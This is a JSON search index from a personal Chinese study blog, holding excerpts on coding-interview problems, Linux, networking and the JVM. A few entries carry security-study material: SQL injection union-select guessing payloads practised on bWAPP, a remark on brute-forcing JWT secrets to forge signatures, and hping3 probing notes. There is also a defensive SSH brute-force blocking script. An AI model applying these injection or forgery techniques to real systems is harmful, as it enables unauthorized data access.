如果给定的节点是中序遍历序列的最后一个，则返回空节点;","lvl0":"二叉树的下一个节点","lvl1":null,"lvl2":"摘要","objectID":"9eb3151d7a028d4f9b4b3231793e19ee","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9/"},{"content":"二叉搜索树转链表 输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。 要求不能创建任何新的结点，只能调整树中结点指针的指向。 注意： 需要","lvl0":"二叉搜索树转链表","lvl1":null,"lvl2":"摘要","objectID":"399eac9e194f33e9f05f613a501d5640","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E8%BD%AC%E9%93%BE%E8%A1%A8/"},{"content":"解题思路 $n\u0026amp;(n-1) 的结果为 110\u0026amp;101 ,得到 100,$ $n\u0026amp;(n-1),可以去掉一个1$ 1 2 3 4 5 6 7 8 9 10 11 class Solution { public: int NumberOf1(int n) { int res = 0; while(n) { res++; n = n\u0026amp;(n-1); } return res; } };","lvl0":"二进制中1的个数","lvl1":null,"lvl2":"摘要","objectID":"a3e0cc66d6bfe4d04f58481f49fc9ed5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/"},{"content":"二维数组查找 在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。 请完成一个函数，输入这样的一个二维数组","lvl0":"二维数组查找","lvl1":null,"lvl2":"摘要","objectID":"b0559639675a7780e44385bb3768a051","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/"},{"content":"面试题 05.03. 翻转数位 Difficulty: 简单 给定一个32位整数 num，你可以将一个数位从0变为1。请编写一个程序，找出你能够获得的最长的一串1的长度。 示例 1： 1 2","lvl0":"翻转数位","lvl1":null,"lvl2":"摘要","objectID":"c8787aab90cd9db52663233826663d8a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/%E7%BF%BB%E8%BD%AC%E6%95%B0%E4%BD%8D%E7%BD%91%E6%98%93%E7%AC%94%E8%AF%95%E9%A2%98/"},{"content":"防止ssh暴力破解脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #! /bin/bash cat /var/log/secure|awk \u0026#39;/Failed/{print $(NF-3)}\u0026#39;|sort|uniq -c|awk \u0026#39;{print $2\u0026#34;=\u0026#34;$1;}\u0026#39; \u0026gt; /usr/local/bin/black.list for i in `cat /usr/local/bin/black.list` do IP=`echo $i |awk -F= \u0026#39;{print $1}\u0026#39;` NUM=`echo $i|awk -F= \u0026#39;{print $2}\u0026#39;` if [ ${NUM} -gt 5 ]; then grep $IP","lvl0":"防止ssh暴力破解","lvl1":["linux"],"lvl2":"摘要","objectID":"32221236fbd7d52977c6300de31679ae","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/%E9%98%B2%E6%AD%A2-ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"},{"content":"","lvl0":"分布式环境 leader选举","lvl1":null,"lvl2":"摘要","objectID":"8d2b5d54ed436503d08d26f6fc53a269","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/leader%E9%80%89%E4%B8%BE%E4%BA%92%E6%96%A5%E9%94%81-etcd%E7%AD%89/"},{"content":"封装websocket api 参考的相关文章 参考github的 example golang 后台 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38","lvl0":"封装websocket api 【golang后端】","lvl1":null,"lvl2":"摘要","objectID":"40a9291c03b1b70595d3f9254b1ee253","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E9%A1%B9%E7%9B%AE%E8%84%9A%E6%9C%AC/%E5%B0%81%E8%A3%85websocketapi/"},{"content":"服务端开发流程 创建 socket，返回 文件描述符 lfd \u0026ndash;socket() 将 lfd 和 ip port 绑定 \u0026ndash;bind() 将 lfd 由主动监听边被动监听 接受一个新的连接，得到一个 文件描述符 cfd \u0026ndash;accept() 这个是通信","lvl0":"服务端开发流程【网络基础】","lvl1":null,"lvl2":"摘要","objectID":"c02dbd39a6c92874a0d1d65b534464ec","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"},{"content":"请实现一个函数可以复制一个复杂链表。 在复杂链表中，每个结点除了有一个指针指向下一个结点外，还有一个额外的指针指向链表中的任意结点或者null","lvl0":"复制链表","lvl1":null,"lvl2":"摘要","objectID":"4b4434a7ea1bd5f0138413f261e0440a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%A4%8D%E5%88%B6%E9%93%BE%E8%A1%A8/"},{"content":"面试视频 eureka ，分布式，微服务 视频，工作6年， eureka,nacos 分布式事务怎么解决 base 理论： 基本可用，软状态，最终一致性 是什么： 多个服务协同完成这个事务 怎么做： tcc","lvl0":"工作6年的面试视频","lvl1":["八股文"],"lvl2":"摘要","objectID":"cda40ec58d5ede440347aec6d44ee516","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%A7%86%E9%A2%91%E8%B5%84%E6%96%99%E5%AE%9E%E6%88%98/%E5%B7%A5%E4%BD%9C6%E5%B9%B4%E9%9D%A2%E8%AF%95%E8%A7%86%E9%A2%91/"},{"content":"给定一个数组A[0, 1, …, n-1]，请构建一个数组B[0, 1, …, n-1]，其中B中的元素B[i]=A[0]×A[1]×… ×A[i-1]×A[","lvl0":"构建乘积数组","lvl1":null,"lvl2":"摘要","objectID":"cccd10c2414a6ba7bb19eadbd0112c1f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E7%BB%84or%E5%89%8D%E7%BC%80%E5%92%8C/%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84/"},{"content":"股票的最大利润 假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖 一次 该股票可能获得的利润是多少？ 例如一只股票在某些时间节点的价格为 [9","lvl0":"股票的最大利润","lvl1":null,"lvl2":"摘要","objectID":"19740432d295a624564279edc99fc114","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6%E4%B8%89%E4%B8%83%E7%AC%94%E8%AF%95/"},{"content":"管理员页面制作方法 文档链接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57","lvl0":"管理员页面制作","lvl1":null,"lvl2":"摘要","objectID":"8068bd45f96a5549c6969e13d4bbd17e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C/%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"content":"解题思路 归并排序 解题代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */ class Solution { public: ListNode* merge(ListNode*","lvl0":"合并两个排序链表","lvl1":null,"lvl2":"摘要","objectID":"c86c58cdf4b30a1c5192008c3ae70741","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/"},{"content":"给定一个数组和滑动窗口的大小，请找出所有滑动窗口里的最大值。 例如，如果输入数组 [2,3,4,2,6,2,5,1][2,3,4,2,6,2,5,1] 及滑动窗口的大小 3 ，那么一共存在 6 个滑动窗口，它们的最大值分","lvl0":"滑动窗口内的最大值","lvl1":null,"lvl2":"摘要","objectID":"3ff9b69ee50db9b654dc5285ee2c2f30","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC/"},{"content":"jwt原理 jwt 是以 . 作为区分， 如果 使用 pyjwt 对密钥进行爆破，爆破出密钥，就能对 JWT 进行篡改了【伪造签名】 水平权限【权限控制】","lvl0":"会话管理","lvl1":null,"lvl2":"摘要","objectID":"7d6db2ea678f539a00bcddff65b614b9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/"},{"content":"地上有一个 $m $行和 $n$ 列的方格，横纵坐标范围分别是$ 0∼m−1$ 和 $0∼n−1$ 。 一个机器人从坐标 $(0,0)$的格子开始移动，每一次只能向左","lvl0":"机器人的运动范围","lvl1":null,"lvl2":"摘要","objectID":"da1babb1bd9379a8b2e47260fd922ef1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%90%9C%E7%B4%A2/%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/"},{"content":"基础命令 chmod ， change mod 修改模式，比如 chmod a+x app.sh cd , change directory , 切换目录 ls -l, 用列表的方式展示【 -l 表示 一行一个，列表的方式】 chown ,change owner ,改变所属用户 chgrp,change group ,改变所属组","lvl0":"基础命令","lvl1":null,"lvl2":"摘要","objectID":"eb220142c4cb5f5c151ae706944cc923","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"content":"免责声明： 这个是我学习网络的笔记，不要拿笔记上的方法来做坏事,后果自负 hping3使用方法 hping3 hping 是 面向命令行的用于生成和解析TCP/IP协议数","lvl0":"基于ping 命令探测学习","lvl1":null,"lvl2":"摘要","objectID":"9b9c88c872226de6a57b5c40dcf6e4d3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/ping%E5%91%BD%E4%BB%A4%E6%8E%A2%E6%B5%8B/"},{"content":"TCP 有哪些定时器 如果TCP连接的双方都没有向对方发送数据，则在两个TCP模块之间不交换任何信息。 如果一个给定的连接在两个小时之内没有任何动作，","lvl0":"计算机网络_TCP专题","lvl1":null,"lvl2":"摘要","objectID":"864c3c67575ab1a91cb42b2e49b08839","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C_tcp%E4%B8%93%E9%A2%98/"},{"content":"TCP 相关 TCP 流量控制 学习教程 建立连接 会有 syn + ack 机制， 表示 建立连接和 接收成功 发送数据会有 seq+ ACK 机制， 表示发送数据包的序列化 还有对应的应答 公式： $ TC","lvl0":"计算机网络八股文","lvl1":null,"lvl2":"摘要","objectID":"c8b2131866fa78d6232a5e65871f468d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB%E8%82%A1%E6%96%87/"},{"content":"必记概念 主机号全1 为广播地址 【UDP 广播原理 】 主机号全0 为网段地址 【代表整个网络 】 192.168.0.1 - 192.168.0.254 IP地址 Ip计算 题目1. 一个C类网络被划分子网，新的","lvl0":"计算题刷题","lvl1":null,"lvl2":"摘要","objectID":"9a8dc337b8ddd5d672d1d446de0b1d39","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E9%A2%98%E5%88%B7%E9%A2%98/"},{"content":"什么是寄存器，内存对齐 学习的视频 64位寄存器有 64根数据线， 一根线可以表示 0 和 1 这样子 64位 CPU GPRS （general-purposeRegist","lvl0":"寄存器原理，64位，32位","lvl1":["八股文"],"lvl2":"摘要","objectID":"471d59c9791a0c7d788fce1446efb048","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E9%80%9F%E6%88%90%E8%AF%BE/%E5%AF%84%E5%AD%98%E5%99%A8%E5%8E%9F%E7%90%8664%E4%BD%8D32%E4%BD%8D/"},{"content":"剪绳子 给你一根长度为 n 绳子，请把绳子剪成 m 段（m、n 都是整数，$2≤n≤58$ 并且 $m≥2$ ）。 每段的绳子的长度记为$ k[1]、k[2]、…","lvl0":"剪绳子","lvl1":null,"lvl2":"摘要","objectID":"7b4dce0d83cc404c6f893496d0f5a061","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E5%89%AA%E7%BB%B3%E5%AD%90/"},{"content":"sql 注入学习 sql注入猜解 1 2 3 4 5 6 7 8 9 10 11 -- 猜字段数 unionselect1,2-- -- 猜数据库 selectschema_namefromdatabase.schemata-- 猜数据表列 select*fromtable_nameselecttable_namefromdatabase.tableswheretable_schema=\u0026#34;aaa\u0026#34;-- 获取某列内容 select*fromcolumn_name bwapp使用 访问 /install.php 初始化应用 点击 sql injection(get/search) 练习 输","lvl0":"简单sql注入学习","lvl1":null,"lvl2":"摘要","objectID":"8cdcf0baed4df95ee0a72a4d113357e9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/%E7%AE%80%E5%8D%95sql%E6%B3%A8%E5%85%A5/"},{"content":"如何将脚本加入环境变量 https://www.cnblogs.com/youyoui/p/10680329.html 1 2 3 vi /etc/profile # 在最后一行加上 export PATH=$PATH:/home/uusama/mysql/bin","lvl0":"将脚本加入环境变量","lvl1":null,"lvl2":"摘要","objectID":"c8c959a222faee67d036a74b7809efdf","tags":["个人总结"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E5%B0%86%E8%84%9A%E6%9C%AC%E5%8A%A0%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"content":"需要了解的命令 命令 解释 pmap 用来查看进程空间信息 strace 查看进程调用过程 cat /proc/[pid]/maps 查看进程地址空间机制 参考的学习视频 静态链接和动态链接的概念 动态链接是指在生","lvl0":"进程操作","lvl1":null,"lvl2":"摘要","objectID":"cb2a45d98feec1fad2f21d7ca8689789","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E8%BF%9B%E7%A8%8B%E6%93%8D%E4%BD%9C/"},{"content":"进程运行的5种状态 学习的视频 初始态，终止态，就绪态 和 挂起态， 挂起是指的是阻塞 ，进程放弃了 CPU 的执行权限。 我们知道 ，每个进程在内核中都有一个 进程","lvl0":"进程运行的状态","lvl1":null,"lvl2":"摘要","objectID":"918b4f4c6cfeb523b44e8465a12864dd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%9A%84%E7%8A%B6%E6%80%81/"},{"content":"进程状态总结 子进程 退出 后 发送 exit 信号 给父进程 比如 shell 中执行 ls shell 是个父进程， ls 是个子进程， 执行 ls的时候 shell 是不能跑的 子进程 执行 完成 之后， 退出时候 子","lvl0":"进程状态","lvl1":null,"lvl2":"摘要","objectID":"d54343b92da9af36a87cb4e384890c72","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81/"},{"content":"请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。 路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右","lvl0":"矩阵中的路径","lvl1":null,"lvl2":"摘要","objectID":"c184c28ebc0df07cfe7f3c75f185f737","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%90%9C%E7%B4%A2/%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/"},{"content":"开启新终端 ctrl + shift + t","lvl0":"快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"7b156c62bb2e48ea54c2f47dd4370afe","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"},{"content":"垃圾回收机制 讲一下堆常见的分配策略 对象优先在Eden区分配 第一次垃圾回收后，如果s区放不下，那么只能通过==分配担保机制==把新生代的对象提","lvl0":"垃圾回收机制","lvl1":null,"lvl2":"摘要","objectID":"7d8abd8ab3a9bc3b2bce56d864714c07","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"content":"类加载过程 类的生命周期说一下 加载、连接（验证，准备，解析）、初始化、使用、卸载 类的加载过程具体说一下 类的加载包括了加载、连接（验证，准备，解","lvl0":"类加载过程","lvl1":null,"lvl2":"摘要","objectID":"f5cea0773c1cee07a82912c8f41552f0","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/"},{"content":"类加载器 jvm内置的类加载器说一下，各负责加载什么 BootstrapClassLoader(启动类加载器)：负责加载%JAVA_HOME%/","lvl0":"类加载器","lvl1":null,"lvl2":"摘要","objectID":"f5924c336fc893ebc2ca81c82f6e3874","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"content":"输入一个 非空 整型数组，数组里的数可能为正，也可能为负。 数组中一个或连续的多个整数组成一个子数组。 求所有子数组的和的最大值。 要求时间复杂度为 $O(N)$","lvl0":"连续子数组的最大和","lvl1":null,"lvl2":"摘要","objectID":"b6e24fdc7f86b62a3386ac5432ce964e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E8%B4%AA%E5%BF%83/%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E6%9C%80%E5%A4%A7%E5%92%8C/"},{"content":"链表倒数第K个节点 输入一个链表，输出该链表中倒数第 kk 个结点。 注意： k \u0026gt;= 1; 如果 kk 大于链表长度，则返回 NULL; 样例 1 2 3 输入：链表：1-\u0026gt;2-\u0026","lvl0":"链表倒数第K个节点","lvl1":null,"lvl2":"摘要","objectID":"26c1379cab349b6265743fffc474a90e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/"},{"content":"链表环的入口节点 快慢指针， 快指针 走了 $a+b+c+d$, 然后慢指针 走了 $a+b$, 两个指针 在 紫色点相遇。快指针一次走2步，可以列出方程 $$ a+b+c+b = 2*(a+b)\\ 得到:\\ a = c $$ 然后 一直指","lvl0":"链表环的入口节点","lvl1":null,"lvl2":"摘要","objectID":"51382c05960e4d7e78e31dacab315fe2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E8%8A%82%E7%82%B9/"},{"content":"考过2次的题目 一个长度为100的循环链表，指针A和指针B都指向了链表中的同一个节点，A以步长为1向前移动，B以步长为3向前移动，一共至少需要","lvl0":"链表问题","lvl1":null,"lvl2":"摘要","objectID":"c5824591841930dc128e1a3a27bb55dc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98%E8%80%83%E8%BF%872%E6%AC%A1/"},{"content":"线程执行完或者出现异常就会进入终止状态。这样看，终止一个线程看上去很简单啊！一个线程执行完自己的任务，自己进入终止状态，这的确很简单。不过我","lvl0":"两阶段终止模式","lvl1":null,"lvl2":"摘要","objectID":"de96f22ba1bb16323e4fc0f10a2b67ca","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E4%B8%A4%E9%98%B6%E6%AE%B5%E7%BB%88%E6%AD%A2%E6%A8%A1%E5%BC%8F%E4%BC%98%E9%9B%85%E7%9A%84%E5%81%9C%E6%AD%A2%E7%BA%BF%E7%A8%8B/"},{"content":"学习教程 参考博客 官方帮助文档：https://mermaid-js.github.io/mermaid/#/flowchart 总结 